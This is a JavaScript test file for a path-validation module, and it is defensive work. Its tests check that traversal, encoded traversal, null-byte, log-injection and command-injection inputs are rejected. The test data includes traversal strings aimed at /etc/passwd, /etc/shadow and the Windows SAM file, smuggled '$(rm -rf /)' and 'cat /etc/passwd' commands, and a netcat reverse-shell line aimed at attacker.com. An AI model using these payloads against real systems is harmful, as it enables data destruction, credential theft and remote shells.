import test from 'ava';
import {
  validateAndNormalizePath,
  validateFilePatterns,
  createPathValidator,
} from '../src/path-validation.js';

test('should reject null byte injection', (t) => {
  t.throws(() => validateAndNormalizePath('path\0malicious'));
  t.throws(() => validateAndNormalizePath('path\0'));
});

test('should reject obvious path traversal attempts', (t) => {
  t.throws(() => validateAndNormalizePath('../../../etc/passwd'), {
    message: /Path traversal detected/,
  });
  t.throws(() => validateAndNormalizePath('..\\..\\..\\windows\\system32\\config\\sam'), {
    message: /Path traversal detected/,
  });
  t.throws(() => validateAndNormalizePath('folder/../../../etc/passwd'), {
    message: /Path traversal detected/,
  });
});

test('should reject encoded path traversal attempts', (t) => {
  t.throws(() => validateAndNormalizePath('..%2F..%2F..%2Fetc%2Fpasswd'), {
    message: /Encoded path traversal detected/,
  });
  t.throws(() => validateAndNormalizePath('..%5C..%5C..%5Cwindows%5Csystem32'), {
    message: /Encoded path traversal detected/,
  });
});

test('should reject absolute paths when not allowed', (t) => {
  t.throws(() => validateAndNormalizePath('/etc/passwd'), {
    message: /Absolute paths not allowed/,
  });
  t.throws(() => validateAndNormalizePath('C:\\Windows\\System32'), {
    message: /Absolute paths not allowed/,
  });
});

test('should reject suspicious system directory patterns', (t) => {
  t.throws(() => validateAndNormalizePath('folder/etc/passwd'), {
    message: /Suspicious path pattern detected/,
  });
  t.throws(() => validateAndNormalizePath('folder/proc/cpuinfo'), {
    message: /Suspicious path pattern detected/,
  });
  t.throws(() => validateAndNormalizePath('folder/sys/kernel'), {
    message: /Suspicious path pattern detected/,
  });
  t.throws(() => validateAndNormalizePath('folder/windows/system32'), {
    message: /Suspicious path pattern detected/,
  });
  t.throws(() => validateAndNormalizePath('folder/program files/app'), {
    message: /Suspicious path pattern detected/,
  });
  t.throws(() => validateAndNormalizePath('folder/users/admin'), {
    message: /Suspicious path pattern detected/,
  });
});

test('should allow safe relative paths', (t) => {
  t.is(validateAndNormalizePath('src/index.ts'), 'src/index.ts');
  t.is(validateAndNormalizePath('docs/readme.md'), 'docs/readme.md');
  t.is(validateAndNormalizePath('packages/utils/helper.js'), 'packages/utils/helper.js');
});

test('should normalize path separators', (t) => {
  t.is(validateAndNormalizePath('src\\index.ts'), 'src/index.ts');
  t.is(validateAndNormalizePath('packages/utils\\helper.js'), 'packages/utils/helper.js');
});

test('should handle empty and current directory components', (t) => {
  t.is(validateAndNormalizePath('src/./index.ts'), 'src/index.ts');
  t.is(validateAndNormalizePath('./src/index.ts'), 'src/index.ts');
  t.is(validateAndNormalizePath('src//index.ts'), 'src/index.ts');
});

test('should work with allowed base paths', (t) => {
  const allowedPaths = ['/home/user/project', '/var/www'];
  t.is(
    validateAndNormalizePath('/home/user/project/src/index.ts', allowedPaths),
    'home/user/project/src/index.ts',
  );
  t.is(validateAndNormalizePath('/var/www/index.html', allowedPaths), 'var/www/index.html');
});

test('should reject paths outside allowed base paths', (t) => {
  const allowedPaths = ['/home/user/project'];
  t.throws(() => validateAndNormalizePath('/etc/passwd', allowedPaths), {
    message: /Path not within allowed base paths/,
  });
  t.throws(() => validateAndNormalizePath('/var/www/index.html', allowedPaths), {
    message: /Path not within allowed base paths/,
  });
});

test('should reject non-array input for patterns', (t) => {
  t.throws(() => validateFilePatterns('not-an-array'), { message: /Patterns must be an array/ });
});

test('should reject empty strings in patterns', (t) => {
  t.throws(() => validateFilePatterns(['']), {
    message: /Each pattern must be a non-empty string/,
  });
  t.throws(() => validateFilePatterns(['*.ts', '']), {
    message: /Each pattern must be a non-empty string/,
  });
});

test('should reject patterns with dangerous characters', (t) => {
  t.throws(() => validateFilePatterns(['$(rm -rf /)']), {
    message: /Pattern contains potentially dangerous characters/,
  });
  t.throws(() => validateFilePatterns(['`cat /etc/passwd`']), {
    message: /Pattern contains potentially dangerous characters/,
  });
  t.throws(() => validateFilePatterns(['file|cat']), {
    message: /Pattern contains potentially dangerous characters/,
  });
});

test('should validate safe glob patterns', (t) => {
  t.deepEqual(validateFilePatterns(['*.ts', '*.js']), ['*.ts', '*.js']);
  t.deepEqual(validateFilePatterns(['src/**/*.ts', 'docs/*.md']), ['src/**/*.ts', 'docs/*.md']);
});

test('should apply path validation to each pattern', (t) => {
  t.throws(() => validateFilePatterns(['../../../etc/passwd']), {
    message: /Path traversal detected/,
  });
  t.throws(() => validateFilePatterns(['safe.ts', '../../../dangerous']), {
    message: /Path traversal detected/,
  });
});

test('should create a validator with specific allowed base paths', (t) => {
  const validator = createPathValidator(['/home/user/project']);

  t.is(validator.validatePath('/home/user/project/src/index.ts'), 'home/user/project/src/index.ts');

  t.throws(() => validator.validatePath('/etc/passwd'), {
    message: /Path not within allowed base paths/,
  });

  t.deepEqual(validator.validatePatterns(['/home/user/project/*.ts']), ['/home/user/project/*.ts']);
});

test('should prevent Linux system file access', (t) => {
  const attacks = [
    '../../../etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '/etc/passwd',
    '/etc/shadow',
    '/proc/version',
    '/sys/kernel/version',
    'config/../../../etc/passwd',
    'src/../../etc/passwd',
  ];

  attacks.forEach((attack) => {
    t.throws(() => validateAndNormalizePath(attack), `Should block: ${attack}`);
  });
});

test('should prevent Windows system file access', (t) => {
  const attacks = [
    '..\\..\\..\\windows\\system32\\config\\sam',
    '..%5C..%5C..%5Cwindows%5Csystem32',
    'C:\\Windows\\System32\\drivers\\etc\\hosts',
    'windows/system32/config/sam',
    'program files/internet explorer/iexplore.exe',
    'users/administrator/desktop/secrets.txt',
  ];

  attacks.forEach((attack) => {
    t.throws(() => validateAndNormalizePath(attack), `Should block: ${attack}`);
  });
});

test('should prevent log injection and command injection', (t) => {
  const attacks = [
    'file.txt\n[CRITICAL] System compromised',
    'file.txt\r\n[ERROR] Root access granted',
    'file$(cat /etc/passwd).txt',
    'file`whoami`.txt',
    'file|nc attacker.com 4444 -e /bin/bash.txt',
  ];

  attacks.forEach((attack) => {
    t.throws(() => validateAndNormalizePath(attack), `Should block: ${attack}`);
  });
});

test('should allow legitimate file paths', (t) => {
  const legitimate = [
    'src/index.ts',
    'docs/readme.md',
    'packages/utils/helper.js',
    'tests/security.test.js',
    'config/app.json',
    'public/css/style.css',
    'scripts/build.sh',
    'assets/images/logo.png',
    'data/import.csv',
    'lib/math/calculator.js',
  ];

  legitimate.forEach((path) => {
    t.notThrows(() => validateAndNormalizePath(path), `Should allow: ${path}`);
  });
});
